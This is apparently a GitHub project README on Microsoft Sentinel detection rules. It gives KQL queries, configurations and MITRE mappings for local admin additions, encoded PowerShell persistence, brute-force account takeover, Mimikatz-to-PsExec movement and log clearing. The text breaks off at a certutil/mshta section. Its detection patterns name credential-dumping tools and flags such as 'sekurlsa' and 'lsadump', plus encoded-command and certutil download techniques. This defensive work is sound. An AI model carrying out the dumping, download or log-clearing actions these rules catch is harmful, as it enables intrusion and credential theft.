| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Aggregates and runs evaluation queries across defined time windows. |
| **Run Query Every** | 5 Minutes | Continuously monitors for privilege escalation events. |
| **Lookup Data From** | Last 6 Minutes | Provides a 1-minute overlap buffer to handle log ingestion delays safely. |
| **Severity** | High | Unauthorized local admin additions represent an immediate threat to endpoint integrity. |
| **Status** | Enabled | Ensures the detection is currently active. |

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154935" src="https://github.com/user-attachments/assets/36606bdc-1969-49f3-bcf7-6b329d4f2e8e" />

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | TargetAccount |

### Why map these entities?
* **Host:** Identifies the specific endpoint where the local group modification occurred.
* **Account:** Identifies the target user account that was elevated to administrative privileges.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154920" src="https://github.com/user-attachments/assets/2029890f-0e82-49fa-8ff9-f43374567f2b" />

---

## 🔄 Detection Workflow

    Attacker escalates privileges and adds a user to Local Administrators
                │
                ▼
    Target Host logs Event ID 4732 or 4728
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel Scheduled Rule evaluates the last 6 minutes of data
                │
                ▼
    EventID matches 4732 or 4728
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Alert grouping disabled)
                │
                ▼
    SOC Analyst Assigned & Privilege Verification Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4732** or **4728** is logged.
* The query returns more than 0 results within the scheduled 5-minute interval.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Modifications to local administrator groups should be tightly controlled and rare. Disabling alert grouping ensures that every individual account elevation generates a distinct, immediate ticket for verification.


---

## ✅ Validation
This detection can be validated in a lab environment by opening an elevated command prompt and adding a user to the local administrators group (e.g., `net localgroup Administrators TestUser /add`). Microsoft Sentinel will capture the event and generate an incident. *(Ensure you remove the user immediately after validation using `net localgroup Administrators TestUser /delete`).*

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154954" src="https://github.com/user-attachments/assets/db987921-df35-4ef7-869f-0d12feb6e268" />

---

## 🎯 Security Impact
This detection helps security teams:
* Intercept local privilege escalation attempts early in the kill chain.
* Audit unauthorized administrative account creation across endpoints.
* Protect critical assets from rogue user elevations and insider threats.

---

⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🤖 Rule Templates & Machine Learning Behavioral Analytics

## 🎯 Objective
This section covers rules created using pre-built Microsoft Sentinel rule templates, including Machine Learning (ML) Behavioral Analytics rules and Threat Intelligence integrations. These rules leverage advanced detection models to identify anomalous user behavior and high-fidelity threat matches without requiring custom KQL authoring.

---

## 📖 Threat Overview
Standard signature-based detection rules can miss sophisticated attacks that blend in with normal administrative tasks or rely on legitimate credentials. Rule templates bridge this gap by introducing built-in heuristics, ML-driven behavior profiling (such as tracking unusual IP addresses, unexpected geographic locations, or anomalous session sign-ins), and automated threat intelligence matching against live event streams.

---

## 🔥 Severity
**Medium**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Initial Access | Valid Accounts | T1078 |
| Persistence | Account Manipulation | T1098 |
| Lateral Movement | Remote Services | T1021 |

---

## 📂 Data Sources
* Windows Security Event Logs (RDP and authentication telemetry)
* Syslog data (SSH login activity)
* Microsoft Defender Threat Intelligence feeds
* Log Analytics Workspace
* Microsoft Sentinel ML Behavioral Analytics Engine

---

## 📑 Rule Templates Overview
The following pre-built templates were deployed and configured:

1. **(Preview) Anomalous RDP Login Detections**
   * *Type:* ML Behavior Analytics
   * *Purpose:* Identifies anomalous Remote Desktop Protocol login activity using machine learning based on Windows Security Event data, flagging unusual IPs, unusual geographies, or unexpected new users.
2. **(Preview) Anomalous SSH Login Detection**
   * *Type:* ML Behavior Analytics
   * *Purpose:* Identifies anomalous Secure Shell login activity based on syslog data using behavioral profiling over a 30-day baseline.
3. **Microsoft Defender Threat Intelligence Analytics**
   * *Type:* Threat Intelligence rule
   * *Purpose:* Generates high-fidelity alerts when active threat intelligence indicators (IPs, domains, hashes) match internal event logs.

---

## ⚙️ Rule Configuration Summary
| Template Rule Name | Rule Type | Severity | Baseline / Learning Period |
|---------------------|-----------|----------|---------------------------|
| **(Preview) Anomalous RDP Login Detections** | ML Behavior Analytics | Medium | Built-in ML profiling (requires normal activity baseline) |
| **(Preview) Anomalous SSH Login Detection** | ML Behavior Analytics | Medium | 7-day learning period for environment profiling |
| **Microsoft Defender Threat Intelligence Analytics** | Threat Intelligence | Medium | Real-time indicator matching |

---

## 🔄 Detection Workflow

    Microsoft Sentinel ingests telemetry (Windows Events, Syslog, TI Feeds)
                │
                ▼
    ML Behavioral Engine / TI Matcher evaluates incoming logs against historical profiles
                │
                ▼
    Anomaly detected (e.g., Unusual IP/Geo for RDP/SSH or active TI indicator match)
                │
                ▼
    Alert Generated automatically via built-in template logic
                │
                ▼
    Incident Created & Assigned to SOC Analyst for Behavioral Investigation

---

## ✅ Validation
Behavioral and template-based rules can be validated by allowing the Sentinel machine learning engine to build its baseline profile over the required training window (e.g., 7 days for SSH detection), or by testing threat intelligence indicator matches using controlled, safe artifact checks within the lab workspace.

---

## 🎯 Security Impact
Utilizing rule templates and ML behavior analytics helps security teams:
* Detect stealthy account compromises and anomalous remote logins that bypass static rules.
* Reduce manual rule-writing overhead while leveraging Microsoft's global threat intelligence.
* Establish automated anomaly baselines for critical remote access services like RDP and SSH.

---

## 📸 Screenshots

### Anomalous RDP Login Detections
* **General & Description:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155346" src="https://github.com/user-attachments/assets/c984eb26-a8ba-4949-bcb1-b66c47b7acf8" />

* **Automated Response:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155353" src="https://github.com/user-attachments/assets/3aa5a6f5-c336-45eb-a195-e485db3e79b2" />

* **Review & Create:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155402" src="https://github.com/user-attachments/assets/a58fd2e8-a708-4e0b-99d4-c8897ae478db" />


### Anomalous SSH Login Detection
* **General Configuration:**<img width="1920" height="1020" alt="Screenshot 2026-08-04 155455" src="https://github.com/user-attachments/assets/c3c5556d-7d30-4d28-9b1c-b271b907f1e8" />

* **Automated Response:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155504" src="https://github.com/user-attachments/assets/585329b0-bd8c-4373-9bf1-95815fde3c8f" />

* **Review & Create:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155513" src="https://github.com/user-attachments/assets/64a668df-ceb1-4a21-9df0-4c65734268a5" />


### Microsoft Defender Threat Intelligence Analytics
* **General Configuration:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155426" src="https://github.com/user-attachments/assets/3c311bb0-0787-4c4a-9949-19520ff8b788" />

* **Review & Create:** <img width="1920" height="1020" alt="Screenshot 2026-08-04 155435" src="https://github.com/user-attachments/assets/a32895df-379c-4de1-820c-4e1e177a3b97" />


---

⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔗 Correlation 2: Encoded PowerShell → Registry Run Key

## 🎯 Objective
This core correlation rule tracks a sophisticated multi-stage attack sequence: execution via obfuscated or encoded PowerShell commands followed closely by the establishment of persistence via Registry Run Keys. It connects execution mechanics with survival mechanisms to flag active threats.

---

## 📖 Threat Overview
Attackers frequently use encoded PowerShell commands (using flags like `-enc` or `-encodedcommand`) to bypass script block logging, evade signature detection, and download or execute malicious payloads. To ensure survivability across reboots, they then modify the Windows Registry (such as keys under `CurrentVersion\Run`) to automatically execute that payload every time the system starts. Correlating these two telemetry streams catches the transition from initial execution to persistent compromise.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161718" src="https://github.com/user-attachments/assets/d03a01f8-724b-4c1f-b66f-ef537ff37715" />


---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Persistence, Privilege Escalation | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 |




---

## 📂 Data Sources
* Windows Security Event Logs:
  * Event ID `4688` (Process Creation - monitoring PowerShell execution syntax)
  * Event ID `4657` (A registry value was modified - tracking modifications under `CurrentVersion\Run`)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query correlates encoded PowerShell process executions with subsequent registry modifications within a 10-minute window on the same host and account:

    let PowerShell = 
    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any ("-enc","-encodedcommand","EncodedCommand")
    | project PSTime = TimeGenerated, Computer, Account;
    let RunKey = 
    SecurityEvent
    | where EventID == 4657
    | where ObjectName has @"CurrentVersion\Run"
    | project RunKeyTime = TimeGenerated, Computer, Account;
    PowerShell
    | join kind=inner RunKey on Computer, Account
    | where RunKeyTime between (PSTime .. PSTime + 10m)
    | project Computer, Account, PSTime, RunKeyTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161802" src="https://github.com/user-attachments/assets/11a21ba0-e3df-44ee-99f5-450b223b179a" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Evaluates complex cross-event timing windows across security logs. |
| **Run Query Every** | 5 Minutes | Continuously scans for correlated execution and persistence indicators. |
| **Lookup Data From** | Last 6 Minutes | Incorporates a 1-minute overlap buffer to accommodate log ingestion latency. |
| **Severity** | High | Encoded execution paired with registry persistence is a definitive sign of malicious compromise. |
| **Status** | Enabled | Ensures the correlation rule is actively evaluating incoming telemetry. |


<img width="1920" height="1020" alt="Screenshot 2026-08-04 161825" src="https://github.com/user-attachments/assets/9362df6e-738b-4bfc-a33f-68b8c3c9f3cd" />

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |

### Why map these entities?
* **Host:** Identifies the endpoint where the encoded script ran and the registry was modified.
* **Account:** Identifies the user security context executing the attack chain.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 161811" src="https://github.com/user-attachments/assets/0373f567-e8a0-4c8b-b25f-f856da1b5202" />

---

## 🔄 Detection Workflow

    Attacker executes obfuscated/encoded PowerShell command (-enc)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Attacker writes persistence entry to Registry Run Key (Event ID 4657) within 10 minutes
                │
                ▼
    Microsoft Sentinel Scheduled Rule correlates 4688 and 4657 events
                │
                ▼
    Alert Generated combining execution and persistence phases
                │
                ▼
    Incident Created (Alert grouping disabled for immediate individual visibility)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Endpoint Isolation / Registry Cleanup Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Event ID **4688** logs a PowerShell process creation containing encoding flags (`-enc`, `-encodedcommand`).
* Event ID **4657** logs a modification to a Registry Run Key (`CurrentVersion\Run`) by the same account on the same computer within **10 minutes** of the PowerShell execution.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Correlating encoded execution directly with registry persistence represents a critical, high-fidelity intrusion. Disabling alert grouping ensures every unique detection triggers an immediate, standalone incident ticket for the SOC.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 162110" src="https://github.com/user-attachments/assets/646712f9-818f-43a4-8bb2-788523adbd94" />

---


## 🤖 Automated Responses
This correlation rule is linked to the following automation:
* **Add Triage Tag:** Automatically tags the incident upon creation to streamline analyst triage workflows.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161841" src="https://github.com/user-attachments/assets/a8ce1afc-be95-4e0c-b548-afcf71b50aee" />

---

## ✅ Validation
This rule can be validated in a controlled lab environment by executing an encoded PowerShell command (e.g., base64 encoding a benign command) followed immediately by adding a test entry to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Sentinel will correlate the timestamps and generate a high-severity alert.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161847" src="https://github.com/user-attachments/assets/378e7a4b-1b97-46a4-ba6f-1d286bfa5b38" />

---

## 🎯 Security Impact
This correlation rule helps security teams:
* Connect obfuscated execution vectors directly to persistence mechanisms.
* Cut through noise by verifying multi-stage attacker behavior.
* Rapidly isolate compromised endpoints before payloads execute on reboot.


---

⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔗 Correlation 1: Brute Force → Successful Login → New Local User

## 🎯 Objective
This core analytics rule correlates three distinct stages of a multi-phase attack chain: multiple failed login attempts (Brute Force), a subsequent successful login using those compromised credentials, and the immediate creation of a new local user account for persistence. It serves as a cornerstone detection for end-to-end account compromise and privilege lifecycle tracking.

---

## 📖 Threat Overview
Advanced threat actors rarely rely on a single isolated action. A common kill chain involves cracking an account password via automated brute-force techniques (Event ID `4625`), authenticating successfully into the system with the guessed credentials (Event ID `4624`), and immediately creating a backdoored local user account (Event ID `4720`) to maintain persistent access. Correlating these sequential events within a tight time window dramatically reduces false positives and highlights high-fidelity active intrusions.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 160644" src="https://github.com/user-attachments/assets/af238672-eec3-4a46-a6b6-684d45669dfe" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Valid Accounts | T1078 |
| Persistence | Create Account: Local Account | T1136.001 |


---

## 📂 Data Sources
* Windows Security Event Logs:
  * Event ID `4625` (An account failed to log on)
  * Event ID `4624` (An account was successfully logged on)
  * Event ID `4720` (A user account was created)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query uses multiple `let` statements and inner joins to link brute-force attempts (10+ failures in 10 minutes) with a successful logon and subsequent account creation within defined time windows:

    let BruteForce = 
    SecurityEvent
    | where EventID == 4625
    | summarize FailedAttempts = count() by Account, Computer, bin(TimeGenerated, 10m)
    | where FailedAttempts >= 10;
    let SuccessLogin = 
    SecurityEvent
    | where EventID == 4624
    | project LoginTime = TimeGenerated, Account, Computer;
    let NewUser = 
    SecurityEvent
    | where EventID == 4720
    | project UserCreatedTime = TimeGenerated, Account, Computer;
    BruteForce
    | join kind=inner SuccessLogin on Account, Computer
    | where LoginTime between (TimeGenerated .. TimeGenerated + 10m)
    | join kind=inner NewUser on Account, Computer
    | where UserCreatedTime between (LoginTime .. LoginTime + 10m)
    | project Account, Computer, FailedAttempts, LoginTime, UserCreatedTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 160757" src="https://github.com/user-attachments/assets/555fd850-ede8-4c90-a471-daaffe5558af" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Evaluates sequential cross-event correlation logic over historical time blocks. |
| **Run Query Every** | 5 Minutes | Continuously checks for multi-stage attack patterns. |
| **Lookup Data From** | Last 6 Minutes | Includes a 1-minute overlap buffer to capture trailing ingested logs safely. |
| **Severity** | High | A brute-force attack followed by successful access and local account creation indicates active compromise. |
| **Status** | Enabled | Ensures the correlation rule is actively running. |

<img width="1920" height="1020" alt="Screenshot 2026-08-04 160954" src="https://github.com/user-attachments/assets/cb20efb6-3ca4-4b3e-ba2d-7835f2309b18" />


---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide comprehensive correlation context.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |

### Why map these entities?
* **Account:** Identifies the target user account compromised during the brute-force attack and used to spawn the new user.
* **Host:** Highlights the specific endpoint or domain controller where the entire sequence took place.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 160813" src="https://github.com/user-attachments/assets/d23e059a-c63e-459d-b6ed-0e946b8286e4" />

---

## 🔄 Detection Workflow

    Attacker performs brute-force attack against target account (>= 10 failures)
                │
                ▼
    Attacker logs in successfully using cracked credentials
                │
                ▼
    Attacker creates a new local user account for persistence within 10 minutes
                │
                ▼
    Microsoft Sentinel Scheduled Rule correlates events across 4625, 4624, and 4720 logs
                │
                ▼
    Alert Generated combining the complete attack chain
                │
                ▼
    Incident Created (Grouped by matching entities)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Host Isolation / Account Revocation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* 10 or more failed login events (`4625`) occur for an account on a host within a 10-minute bin.
* A successful login (`4624`) for that same account/host occurs within 10 minutes of the brute force window.
* A new user account creation event (`4720`) occurs within 10 minutes of the successful login.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Multi-stage attacks represent high-priority intrusions. Disabling alert grouping ensures that every unique correlated attack chain triggers an immediate, individual incident ticket for the SOC without merging related alerts.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 162315" src="https://github.com/user-attachments/assets/fcef389a-4ad3-4c85-af41-d69c2a1d7d8c" />

---

## 🤖 Automated Responses
This core correlation rule is integrated with the following automation:
* **Add Triage Tag:** Automatically appends triage tags upon incident creation to prioritize analytical review.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161206" src="https://github.com/user-attachments/assets/28ae47a9-43c6-453d-8ddc-4758d6a34797" />

---

## ✅ Validation
This rule can be validated in a test lab by simulating the exact sequence: executing 10+ failed password attempts on a test account, logging in successfully with the correct password immediately after, and creating a new local user via `net user`. Sentinel will join the timeline and trigger the correlated high-severity alert.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 161213" src="https://github.com/user-attachments/assets/e19198d5-93dd-4782-bb83-ff28a59d597d" />

---

## 🎯 Security Impact
This correlation rule helps security teams:
* Detect end-to-end multi-phase account takeovers rather than treating logs in isolation.
* Uncover stealthy persistence attempts immediately following credential compromise.
* Prioritize high-fidelity triage tickets backed by multiple correlated Windows security events.

---



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔗 Correlation 3: Mimikatz → PsExec

## 🎯 Objective
This core correlation rule tracks a high-severity, multi-stage adversary campaign: credential dumping using tools like Mimikatz, followed closely by internal movement or remote execution using PsExec. It links credential access directly to lateral movement across the network.

---

## 📖 Threat Overview
Once threat actors escalate privileges, their primary objective is often harvesting plaintext credentials or hashes using tools like Mimikatz, `sekurlsa`, or `lsadump` (Event ID `4688`). Armed with these valid credentials, they frequently leverage administrative utilities like PsExec (`psexec`) to execute commands and move laterally to other systems on the network. Correlating credential dumping with remote execution catches active lateral movement in progress.

---

## 🔥 Severity
**High**


<img width="1920" height="1020" alt="Screenshot 2026-08-04 163838" src="https://github.com/user-attachments/assets/d6ab8947-112b-4e85-a16c-55d9f501bf99" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | OS Credential Dumping | T1003 |
| Execution | System Services: Service Execution | T1569.002 |


---



## 📂 Data Sources
* Windows Security Event Logs:
  * Event ID `4688` (Process Creation - monitoring for Mimikatz strings and PsExec execution)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query correlates credential dumping activity with subsequent PsExec execution within a 15-minute timeframe on the same computer and account:

    let Mimikatz = 
    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any ("mimikatz","sekurlsa","lsadump")
    | project MimikatzTime = TimeGenerated, Computer, Account;
    let PsExec = 
    SecurityEvent
    | where EventID == 4688
    | where Process has "psexec"
    | project PsExecTime = TimeGenerated, Computer, Account;
    Mimikatz
    | join kind=inner PsExec on Computer, Account
    | where PsExecTime between (MimikatzTime .. MimikatzTime + 15m)
    | project Computer, Account, MimikatzTime, PsExecTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 163907" src="https://github.com/user-attachments/assets/1f8aa82b-c1db-4df6-a114-74d3843532f8" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Evaluates complex cross-event timing windows across security logs. |
| **Run Query Every** | 5 Minutes | Continuously scans for correlated credential dumping and lateral movement behavior. |
| **Lookup Data From** | Last 6 Minutes | Incorporates a 1-minute overlap buffer to accommodate log ingestion latency. |
| **Severity** | High | Credential theft paired with remote execution indicates an active, severe network breach. |
| **Status** | Enabled | Ensures the correlation rule is actively evaluating incoming telemetry. |

<img width="1920" height="1020" alt="Screenshot 2026-08-04 163930" src="https://github.com/user-attachments/assets/f56acb9f-1915-4e64-84ea-60d54eb96fc9" />

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |

### Why map these entities?
* **Host:** Identifies the endpoint where credentials were dumped and lateral movement was initiated.
* **Account:** Identifies the user security context executing the attack chain.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 163916" src="https://github.com/user-attachments/assets/fcc97168-3027-423c-a443-2ad0e1636323" />


---

## 🔄 Detection Workflow

    Attacker executes credential dumping utility (Mimikatz / sekurlsa)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Attacker launches PsExec for lateral movement within 15 minutes
                │
                ▼
    Microsoft Sentinel Scheduled Rule correlates Mimikatz and PsExec process events
                │
                ▼
    Alert Generated combining credential access and lateral movement phases
                │
                ▼
    Incident Created (Alert grouping disabled for immediate individual visibility)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Network Isolation / Credential Rotation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Event ID **4688** logs a process execution matching credential dumping strings (`mimikatz`, `sekurlsa`, `lsadump`).
* Event ID **4688** logs a PsExec process execution (`psexec`) by the same account on the same computer within **15 minutes** of the credential dumping event.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Correlating credential dumping directly with lateral movement tools represents a critical, high-priority intrusion. Disabling alert grouping ensures every unique detection triggers an immediate, standalone incident ticket for the SOC without merging related alerts.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 163945" src="https://github.com/user-attachments/assets/198eb5b9-1d17-49c3-9b10-ca03abb223d4" />

---

## 🤖 Automated Responses
This correlation rule is linked to the following automation:
* **Add Triage Tag:** Automatically tags the incident upon creation to streamline analyst triage workflows.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 163950" src="https://github.com/user-attachments/assets/c2345f87-ce46-48bb-819b-761f1d3640c6" />


---

## ✅ Validation
This rule can be validated in a controlled lab environment by running safe simulated checks or testing string detection for credential tools followed by administrative execution binaries. Sentinel will correlate the timestamps and generate a high-severity alert.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 164043" src="https://github.com/user-attachments/assets/ef85f600-629d-465d-9874-213ed00b945e" />

---

## 🎯 Security Impact
This correlation rule helps security teams:
* Connect credential theft vectors directly to lateral movement paths.
* Intercept attackers before they propagate across domain controllers.
* Prioritize high-fidelity triage tickets backed by multiple correlated security events.

---



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**


---

# 🔗 Correlation 4: New Service → Event Log Cleared

## 🎯 Objective
This core correlation rule tracks a malicious post-exploitation chain: the installation of a new system service for persistence, followed closely by the clearing or tampering of event logs (Event ID 1102) to wipe forensic evidence. It connects system compromise directly with defense evasion.

---

## 📖 Threat Overview
When adversaries successfully install a new Windows service (Event IDs `4697` or `7045`) to maintain persistent backdoors, they immediately seek to cover their tracks. By clearing the audit logs (such as Event ID `1102` - The audit log was cleared), they attempt to blind security teams and hide the service installation artifacts. Correlating service installation with subsequent log clearing highlights active cover-up behavior.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164349" src="https://github.com/user-attachments/assets/0eb48829-9291-458f-a71c-d77f6b06b424" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Persistence, Privilege Escalation | Create or Modify System Process: Windows Service | T1543.003 |
| Defense Evasion | Indicator Removal on Host: Clear Windows Event Logs | T1070.001 |



---

## 📂 Data Sources
* Windows Security Event Logs:
  * Event ID `4697` / `7045` (A new service was installed)
  * Event ID `1102` (The audit log was cleared)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query correlates new service installations with subsequent event log clearing within a 30-minute timeframe on the same computer:

    let ServiceInstall = 
    SecurityEvent
    | where EventID in (4697,7045)
    | project ServiceTime = TimeGenerated, Computer, Account;
    let LogCleared = 
    SecurityEvent
    | where EventID == 1102
    | project ClearTime = TimeGenerated, Computer, Account;
    ServiceInstall
    | join kind=inner LogCleared on Computer
    | where ClearTime between (ServiceTime .. ServiceTime + 30m)
    | project Computer, Account, ServiceTime, ClearTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164419" src="https://github.com/user-attachments/assets/4d1c6ca9-b26a-41bc-a3e5-d7f71aae27ad" />



---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Evaluates incoming telemetry streams instantly to catch persistence and log clearing concurrently. |
| **Severity** | High | Service installation paired with clearing event logs represents a severe indicator of an active attack. |
| **Status** | Enabled | Ensures the correlation rule is actively running. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |

### Why map these entities?
* **Account:** Identifies the user account responsible for installing the service and clearing logs.
* **Host:** Highlights the endpoint where the service persistence and log deletion occurred.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164428" src="https://github.com/user-attachments/assets/9f3328fd-97c2-42f6-9318-a3367ad21945" />

---

## 🔄 Detection Workflow

    Attacker installs a new Windows service for persistence
                │
                ▼
    Target Host logs Event ID 4697 or 7045
                │
                ▼
    Attacker clears audit logs (Event ID 1102) within 30 minutes to cover tracks
                │
                ▼
    Microsoft Sentinel NRT Rule correlates service installation and log clearing events
                │
                ▼
    Alert Generated combining persistence and defense evasion phases
                │
                ▼
    Incident Created (Alert grouping disabled)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Forensic Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Event ID **4697** or **7045** logs a new service installation.
* Event ID **1102** logs that the audit log was cleared on the same computer within **30 minutes** of the service installation.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Correlating persistence mechanisms directly with log clearing is a critical indicator of compromise. Disabling alert grouping ensures every unique detection triggers an immediate, standalone incident ticket for the SOC.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164443" src="https://github.com/user-attachments/assets/d609a9de-166a-4b72-8c13-d0bf03455d61" />


---

## 🤖 Automated Responses
This correlation rule is linked to the following automation:
* **Add Triage Tag:** Automatically tags the incident upon creation to streamline analyst triage workflows.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164449" src="https://github.com/user-attachments/assets/2a8b10dc-7f4f-4a2c-954d-d5aee2ff4bae" />


---

## ✅ Validation
This rule can be validated in a controlled lab environment by installing a test service and subsequently clearing the security event log using administrative tools. Sentinel will correlate the sequence and generate a high-severity alert.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 164531" src="https://github.com/user-attachments/assets/58dc2845-4eb8-4403-a922-cc6ad75349b8" />


---

## 🎯 Security Impact
This correlation rule helps security teams:
* Uncover hidden persistence methods even when attackers attempt to wipe logs.
* Detect deliberate defense evasion tactics following system modifications.
* Ensure immediate visibility into post-compromise cleanup activities.

---



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔗 Correlation 5: Certutil Download → Mshta Execution

## 🎯 Objective
This core correlation rule tracks a multi-stage adversary execution chain: using `certutil.exe` to download a remote payload (Ingress Tool Transfer / Command and Control), followed closely by executing that payload using `mshta.exe`. It connects file staging directly with living-off-the-land execution.

---

## 📖 Threat Overview
Attackers frequently abuse native Windows binaries (LOLBins) to bypass security controls. A common stealthy technique involves using `certutil.exe` with flags like `-urlcache` or `http://` URLs to download external payloads to the target machine. Once downloaded, they execute the payload using `mshta.exe` to run malicious HTML applications or script code. Correlating these two sequential events provides high-fidelity detection for staged payload delivery and execution.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164623" src="https://github.com/user-attachments/assets/d662a1c9-99ba-43af-b07f-e6060506abb0" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Command and Control | Ingress Tool Transfer | T1105 |
| Defense Evasion | System Binary Proxy Execution: Mshta | T1218.005 |

---

## 📂 Data Sources
